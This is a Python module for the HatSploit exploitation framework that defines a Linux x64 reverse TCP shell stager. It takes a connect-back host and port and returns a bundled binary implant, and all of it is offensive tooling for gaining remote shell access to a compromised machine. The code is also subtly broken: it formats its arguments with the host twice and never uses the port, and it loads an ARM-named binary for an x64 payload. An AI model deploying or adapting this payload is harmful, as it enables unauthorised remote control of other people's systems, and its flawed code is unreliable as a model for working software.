#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.lib.config import Config
from hatsploit.utils.tcp import TCPClient

from hatsploit.external.pwny.session import HatSploitSession


class HatSploitPayload(Payload):
    config = Config()

    details = {
        'Category': "stager",
        'Name': "Linux x64 Shell Reverse TCP",
        'Payload': "linux/x64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    payload = {
        'Session': HatSploitSession,
        'Args': "{} {}"
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        self.payload.update({
            'Args': self.payload['Args'].format(
                connback_host,
                connback_host
            )
        })

        return open(
            self.config.path_config['data_path'] + 'pwny/pwny.armle', 'rb'
        ).read()
